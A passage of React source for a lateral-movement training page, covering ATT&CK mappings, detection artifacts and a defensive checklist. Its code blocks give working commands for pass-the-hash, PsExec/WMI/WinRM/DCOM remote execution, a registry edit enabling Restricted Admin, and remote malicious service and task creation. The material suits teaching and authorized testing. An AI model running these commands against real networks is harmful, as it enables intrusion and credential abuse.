              borderRadius: 4,
              border: `1px solid ${theme.border}`,
              position: "relative",
              overflow: "hidden",
              "&::before": {
                content: '""',
                position: "absolute",
                top: 0,
                left: 0,
                right: 0,
                height: "4px",
                background: `linear-gradient(90deg, ${theme.primary}, ${theme.secondary}, ${theme.accent})`,
              },
            }}
          >
            <Box sx={{ position: "absolute", top: -50, right: -50, width: 200, height: 200, borderRadius: "50%", background: `radial-gradient(circle, ${alpha(theme.primary, 0.2)} 0%, transparent 70%)`, filter: "blur(40px)" }} />
            <Box sx={{ position: "relative", zIndex: 1 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 3, mb: 2 }}>
                <Box sx={{ p: 2, borderRadius: 3, bgcolor: alpha(theme.primary, 0.15), border: `1px solid ${alpha(theme.primary, 0.3)}`, display: "flex", boxShadow: `0 0 30px ${alpha(theme.primary, 0.3)}` }}>
                  <AccountTreeIcon sx={{ fontSize: 48, color: theme.primary }} />
                </Box>
                <Box>
                  <Typography
                    variant="h3"
                    sx={{
                      fontWeight: 800,
                      background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.primaryLight} 50%, ${theme.secondary} 100%)`,
                      backgroundClip: "text",
                      WebkitBackgroundClip: "text",
                      color: "transparent",
                    }}
                  >
                    Lateral Movement
                  </Typography>
                  <Typography variant="h6" sx={{ color: theme.textMuted, fontWeight: 400, mt: 0.5 }}>
                    Techniques for moving through networks and compromising additional systems
                  </Typography>
                </Box>
              </Box>
              <Box sx={{ display: "flex", gap: 1.5, flexWrap: "wrap", mt: 3 }}>
                {[
                  { icon: <ComputerIcon />, label: "Windows", color: theme.info },
                  { icon: <TerminalIcon />, label: "Linux", color: theme.success },
                  { icon: <VpnKeyIcon />, label: "Credentials", color: theme.warning },
                  { icon: <SecurityIcon />, label: "MITRE ATT&CK", color: theme.accent },
                ].map((chip) => (
                  <Chip
                    key={chip.label}
                    icon={chip.icon}
                    label={chip.label}
                    size="small"
                    sx={{ bgcolor: alpha(chip.color, 0.15), color: chip.color, border: `1px solid ${alpha(chip.color, 0.3)}`, fontWeight: 600, "& .MuiChip-icon": { color: chip.color } }}
                  />
                ))}
              </Box>
            </Box>
          </Paper>
        </Box>

        {/* Tabs Container */}
        <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden" }}>
          <Tabs
            value={tabValue}
            onChange={(_, v) => setTabValue(v)}
            variant="scrollable"
            scrollButtons="auto"
            sx={{
              bgcolor: alpha(theme.primary, 0.05),
              borderBottom: `1px solid ${theme.border}`,
              "& .MuiTab-root": { color: theme.textMuted, fontWeight: 500, minHeight: 64, "&:hover": { color: theme.primary, bgcolor: alpha(theme.primary, 0.1) } },
              "& .Mui-selected": { color: `${theme.primary} !important`, fontWeight: 600 },
              "& .MuiTabs-indicator": { height: 3, borderRadius: "3px 3px 0 0", background: `linear-gradient(90deg, ${theme.primary}, ${theme.secondary})` },
            }}
          >
            <Tab icon={<SecurityIcon />} label="Fundamentals" />
            <Tab icon={<ComputerIcon />} label="Windows Protocols" />
            <Tab icon={<TerminalIcon />} label="Living off the Land" />
            <Tab icon={<VpnKeyIcon />} label="Credential Attacks" />
            <Tab icon={<StorageIcon />} label="Linux/SSH" />
            <Tab icon={<CloudIcon />} label="Cloud Pivoting" />
            <Tab icon={<BugReportIcon />} label="Evasion" />
            <Tab icon={<BuildIcon />} label="Tools" />
          </Tabs>

          {/* Tab 0: Fundamentals */}
          <TabPanel value={tabValue} index={0}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <SecurityIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Lateral Movement Fundamentals
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Alert severity="error" sx={{ mb: 4, bgcolor: alpha(theme.primary, 0.1), border: `1px solid ${alpha(theme.primary, 0.3)}`, "& .MuiAlert-icon": { color: theme.primary } }}>
                <strong>Warning:</strong> These techniques are for authorized penetration testing only. Unauthorized access is illegal.
              </Alert>

              <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
                  <AccountTreeIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>What is Lateral Movement?</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Typography sx={{ color: theme.textMuted, mb: 3, lineHeight: 1.8 }}>
                    Lateral movement refers to techniques attackers use to progressively move through a network after gaining initial access, searching for sensitive data and high-value targets. It's a critical phase in the cyber kill chain.
                  </Typography>
                  <Grid container spacing={2} sx={{ mb: 3 }}>
                    {[
                      { title: "Discovery", desc: "Enumerate hosts, services, users", color: theme.secondary },
                      { title: "Credential Access", desc: "Harvest passwords, hashes, tickets", color: theme.primary },
                      { title: "Movement", desc: "Authenticate to remote systems", color: theme.accent },
                      { title: "Persistence", desc: "Maintain access, avoid detection", color: theme.info },
                    ].map((item) => (
                      <Grid item xs={6} md={3} key={item.title}>
                        <Paper sx={{ p: 2.5, bgcolor: theme.bgNested, border: `1px solid ${alpha(item.color, 0.3)}`, borderRadius: 3, position: "relative", overflow: "hidden", "&::before": { content: '""', position: "absolute", top: 0, left: 0, right: 0, height: "3px", bgcolor: item.color } }}>
                          <Typography sx={{ color: item.color, fontWeight: 700, fontSize: "0.95rem" }}>{item.title}</Typography>
                          <Typography variant="body2" sx={{ color: theme.textMuted, mt: 0.5 }}>{item.desc}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <SecurityIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>MITRE ATT&CK Mapping</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Alert severity="info" sx={{ mb: 3, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                    MITRE ATT&CK Tactic: <strong>TA0008 - Lateral Movement</strong>
                  </Alert>
                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.info, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.info, 0.1) }}>
                          <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Technique ID</TableCell>
                          <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Name</TableCell>
                          <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Description</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["T1021.001", "Remote Desktop Protocol", "RDP to move between systems"],
                          ["T1021.002", "SMB/Windows Admin Shares", "Use C$, ADMIN$, IPC$ shares"],
                          ["T1021.006", "Windows Remote Management", "WinRM/PSRemoting"],
                          ["T1047", "Windows Management Instrumentation", "WMI for remote commands"],
                          ["T1550.002", "Pass the Hash", "NTLM hash authentication"],
                          ["T1550.003", "Pass the Ticket", "Kerberos ticket reuse"],
                        ].map(([id, name, desc], i) => (
                          <TableRow key={id} sx={{ bgcolor: i % 2 === 0 ? "transparent" : alpha(theme.info, 0.03), "&:hover": { bgcolor: alpha(theme.info, 0.08) } }}>
                            <TableCell sx={{ color: theme.info, fontFamily: "monospace", fontWeight: 600 }}>{id}</TableCell>
                            <TableCell sx={{ color: theme.text }}>{name}</TableCell>
                            <TableCell sx={{ color: theme.textMuted }}>{desc}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <CheckCircleIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Prerequisites for Movement</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Grid container spacing={3}>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 3, bgcolor: theme.bgNested, border: `1px solid ${alpha(theme.success, 0.3)}`, borderRadius: 3, height: "100%" }}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 2 }}>
                          <CheckCircleIcon sx={{ color: theme.success }} />
                          <Typography sx={{ color: theme.success, fontWeight: 700, fontSize: "1.1rem" }}>What You Need</Typography>
                        </Box>
                        <List dense>
                          {["Valid credentials (password, hash, or ticket)", "Network access to target (ports open)", "Required privileges on target system", "Enabled protocols/services on target"].map((item) => (
                            <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                              <ListItemIcon sx={{ minWidth: 32 }}><KeyboardArrowRightIcon sx={{ color: theme.success, fontSize: 18 }} /></ListItemIcon>
                              <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 3, bgcolor: theme.bgNested, border: `1px solid ${alpha(theme.primary, 0.3)}`, borderRadius: 3, height: "100%" }}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 2 }}>
                          <WarningIcon sx={{ color: theme.primary }} />
                          <Typography sx={{ color: theme.primary, fontWeight: 700, fontSize: "1.1rem" }}>Common Blockers</Typography>
                        </Box>
                        <List dense>
                          {["Firewall blocking required ports", "Credential Guard / Protected Users", "Network segmentation (VLANs)", "EDR/XDR detecting techniques"].map((item) => (
                            <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                              <ListItemIcon sx={{ minWidth: 32 }}><KeyboardArrowRightIcon sx={{ color: theme.primary, fontSize: 18 }} /></ListItemIcon>
                              <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <VpnKeyIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Credential Types</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.warning, 0.1) }}>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Type</TableCell>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Usage</TableCell>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Limitations</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["Plaintext Password", "All protocols", "Often not available"],
                          ["NTLM Hash", "Pass-the-Hash, SMB, WMI", "Cannot use for Kerberos-only"],
                          ["Kerberos TGT", "Pass-the-Ticket", "Time-limited, domain-specific"],
                          ["SSH Key", "SSH lateral movement", "Linux/Unix only"],
                        ].map(([type, usage, limit], i) => (
                          <TableRow key={type} sx={{ bgcolor: i % 2 === 0 ? "transparent" : alpha(theme.warning, 0.03) }}>
                            <TableCell sx={{ color: theme.info, fontWeight: 600 }}>{type}</TableCell>
                            <TableCell sx={{ color: theme.text }}>{usage}</TableCell>
                            <TableCell sx={{ color: theme.textMuted }}>{limit}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.secondary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.secondary }} />} sx={accordionSummarySx(theme.secondary)}>
                  <SecurityIcon sx={{ color: theme.secondary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Discovery Commands</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="Network & Domain Discovery"
                    code={`# Network Discovery
Get-NetNeighbor | Where-Object { $_.State -eq "Reachable" }
arp -a
nmap -sn 192.168.1.0/24

# Domain Discovery
Get-ADComputer -Filter * | Select-Object Name, DNSHostName
Get-ADUser -Filter * -Properties MemberOf

# Service Discovery
nmap -sV -p 22,135,445,3389,5985 TARGET

# Share Discovery
net view \\\\TARGET
crackmapexec smb TARGETS --shares`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <AccountTreeIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Movement Objectives</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <List dense>
                    {movementObjectives.map((item) => (
                      <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 32 }}>
                          <CheckCircleIcon sx={{ color: theme.info, fontSize: 16 }} />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <SearchIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Artifacts and Telemetry</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.warning, 0.1) }}>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Source</TableCell>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Artifacts</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {artifactMatrix.map((row) => (
                          <TableRow key={row.source} sx={{ bgcolor: "transparent" }}>
                            <TableCell sx={{ color: theme.text, fontWeight: 600 }}>{row.source}</TableCell>
                            <TableCell sx={{ color: theme.textMuted }}>{row.artifact}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <ShieldIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Defensive Checklist</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <List dense>
                    {defensiveChecklist.map((item) => (
                      <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 32 }}>
                          <CheckCircleIcon sx={{ color: theme.success, fontSize: 16 }} />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          {/* Tab 1: Windows Protocols */}
          <TabPanel value={tabValue} index={1}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <ComputerIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Windows Remote Protocols
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Alert severity="info" sx={{ mb: 4, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                Windows offers multiple remote execution protocols. Each has different requirements, artifacts, and detection profiles.
              </Alert>

              <Paper sx={{ p: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 3, border: `1px solid ${alpha(theme.info, 0.2)}` }}>
                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.info, mb: 2 }}>Protocol Matrix</Typography>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha(theme.info, 0.1) }}>
                        <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Protocol</TableCell>
                        <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Ports</TableCell>
                        <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Auth</TableCell>
                        <TableCell sx={{ color: theme.info, fontWeight: 700 }}>Artifacts</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {windowsProtocolMatrix.map((row) => (
                        <TableRow key={row.protocol} sx={{ bgcolor: "transparent" }}>
                          <TableCell sx={{ color: theme.text, fontWeight: 600 }}>{row.protocol}</TableCell>
                          <TableCell sx={{ color: theme.textMuted, fontFamily: "monospace" }}>{row.ports}</TableCell>
                          <TableCell sx={{ color: theme.textMuted }}>{row.auth}</TableCell>
                          <TableCell sx={{ color: theme.textMuted }}>{row.artifacts}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </Paper>

              <Paper sx={{ p: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 3, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                <Typography variant="h6" sx={{ fontWeight: 600, color: theme.warning, mb: 2 }}>Key Event IDs to Watch</Typography>
                <List dense>
                  {windowsEventIds.map((item) => (
                    <ListItem key={item} sx={{ py: 0.25, px: 0 }}>
                      <ListItemIcon sx={{ minWidth: 32 }}>
                        <CheckCircleIcon sx={{ color: theme.warning, fontSize: 16 }} />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
                  <TerminalIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>PsExec & SMB Execution</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Typography sx={{ color: theme.textMuted, mb: 2, lineHeight: 1.7 }}>
                    PsExec uses SMB to copy a service binary and execute commands remotely. Port 445 required.
                  </Typography>
                  <CodeBlock
                    language="cmd"
                    title="PsExec Examples"
                    code={`# Sysinternals PsExec - Basic usage
psexec \\\\TARGET -u DOMAIN\\user -p password cmd.exe

# Run as SYSTEM
psexec \\\\TARGET -u DOMAIN\\user -p password -s cmd.exe

# Execute specific command
psexec \\\\TARGET -u DOMAIN\\user -p password cmd.exe /c "whoami > C:\\output.txt"

# Impacket psexec.py - From Linux
psexec.py DOMAIN/user:password@TARGET
psexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH

# SMBExec - No binary upload
smbexec.py DOMAIN/user:password@TARGET`}
                  />
                  <Alert severity="warning" sx={{ mt: 2, bgcolor: alpha(theme.warning, 0.1), border: `1px solid ${alpha(theme.warning, 0.3)}` }}>
                    <strong>Detection:</strong> Creates service (PSEXESVC), writes to ADMIN$ share, Event ID 7045.
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <ComputerIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>WMI (Windows Management Instrumentation)</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                    WMI provides remote management using DCOM (port 135 + dynamic). No binary upload required.
                  </Typography>
                  <CodeBlock
                    language="powershell"
                    title="WMI Remote Execution"
                    code={`# PowerShell WMI - Process creation
$cred = Get-Credential
Invoke-WmiMethod -ComputerName TARGET -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"

# wmic command line
wmic /node:TARGET /user:DOMAIN\\user /password:pass process call create "cmd.exe /c whoami"

# Impacket wmiexec
wmiexec.py DOMAIN/user:password@TARGET
wmiexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH

# CrackMapExec WMI
crackmapexec wmi TARGET -u user -p password -x "whoami"`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.accent)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
                  <TerminalIcon sx={{ color: theme.accent, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>WinRM / PowerShell Remoting</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                    WinRM enables PowerShell remoting over HTTP (5985) or HTTPS (5986). Native Windows feature.
                  </Typography>
                  <CodeBlock
                    language="powershell"
                    title="WinRM Commands"
                    code={`# Test WinRM connectivity
Test-WSMan -ComputerName TARGET

# Interactive PSSession
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Execute command remotely
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }

# Execute on multiple targets
Invoke-Command -ComputerName DC01,DC02,FILE01 -Credential $cred -ScriptBlock { Get-Process }

# Evil-WinRM from Linux
evil-winrm -i TARGET -u user -p password
evil-winrm -i TARGET -u user -H NTLM_HASH`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.secondary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.secondary }} />} sx={accordionSummarySx(theme.secondary)}>
                  <ComputerIcon sx={{ color: theme.secondary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>DCOM (Distributed COM)</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Typography sx={{ color: theme.textMuted, mb: 2 }}>
                    DCOM allows remote object instantiation. Lower detection profile than PsExec/WMI.
                  </Typography>
                  <CodeBlock
                    language="powershell"
                    title="DCOM Execution"
                    code={`# MMC20.Application - Execute via Document.ActiveView.ExecuteShellCommand
$com = [Type]::GetTypeFromProgID("MMC20.Application","TARGET")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")

# ShellWindows
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami","C:\\Windows\\System32",$null,0)

# Impacket dcomexec.py
dcomexec.py DOMAIN/user:password@TARGET
dcomexec.py -object MMC20 DOMAIN/user:password@TARGET`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <ComputerIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>RDP (Remote Desktop)</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="RDP Connections"
                    code={`# Linux - xfreerdp
xfreerdp /u:user /p:password /v:TARGET /cert-ignore
xfreerdp /u:user /pth:NTLM_HASH /v:TARGET  # Pass-the-Hash (Restricted Admin)

# rdesktop
rdesktop -u user -p password TARGET

# SharpRDP - Command execution via RDP
SharpRDP.exe computername=TARGET command="cmd /c whoami" username=user password=pass

# Enable Restricted Admin Mode (allows PtH)
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <BuildIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Protocol Comparison</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.warning, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.warning, 0.1) }}>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Protocol</TableCell>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Port(s)</TableCell>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Detection</TableCell>
                          <TableCell sx={{ color: theme.warning, fontWeight: 700 }}>Use Case</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["PsExec/SMB", "445", "High", "Quick command exec"],
                          ["WMI", "135+dynamic", "Medium", "Fileless execution"],
                          ["WinRM", "5985/5986", "Medium", "Interactive shell"],
                          ["DCOM", "135+dynamic", "Low", "Stealthy execution"],
                          ["RDP", "3389", "High", "GUI access"],
                        ].map(([proto, port, detection, use], i) => (
                          <TableRow key={proto} sx={{ bgcolor: i % 2 === 0 ? "transparent" : alpha(theme.warning, 0.03) }}>
                            <TableCell sx={{ color: theme.info, fontWeight: 600 }}>{proto}</TableCell>
                            <TableCell sx={{ color: theme.text, fontFamily: "monospace" }}>{port}</TableCell>
                            <TableCell>
                              <Chip
                                label={detection}
                                size="small"
                                sx={{
                                  bgcolor: detection === "High" ? alpha(theme.primary, 0.2) : detection === "Medium" ? alpha(theme.warning, 0.2) : alpha(theme.success, 0.2),
                                  color: detection === "High" ? theme.primary : detection === "Medium" ? theme.warning : theme.success,
                                }}
                              />
                            </TableCell>
                            <TableCell sx={{ color: theme.textMuted }}>{use}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          {/* Tab 2: Living off the Land */}
          <TabPanel value={tabValue} index={2}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <TerminalIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Living off the Land (LOLBins)
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Alert severity="info" sx={{ mb: 4, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                LOLBins are legitimate system binaries that can be abused for malicious purposes, evading signature-based detection.
              </Alert>

              <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
                  <TerminalIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Remote Execution LOLBins</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="cmd"
                    title="Remote Command Execution"
                    code={`# WMIC - Remote process creation
wmic /node:TARGET /user:DOMAIN\\user /password:pass process call create "cmd.exe /c whoami > C:\\output.txt"

# Scheduled Tasks
schtasks /create /s TARGET /u DOMAIN\\user /p password /tn "Update" /tr "cmd /c whoami" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s TARGET /tn "Update"
schtasks /delete /s TARGET /tn "Update" /f

# SC - Service Control
sc \\\\TARGET create evil binpath= "cmd.exe /c whoami" type= own start= demand
sc \\\\TARGET start evil
sc \\\\TARGET delete evil

# WinRS - Windows Remote Shell
winrs -r:TARGET -u:DOMAIN\\user -p:password "whoami && hostname"`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
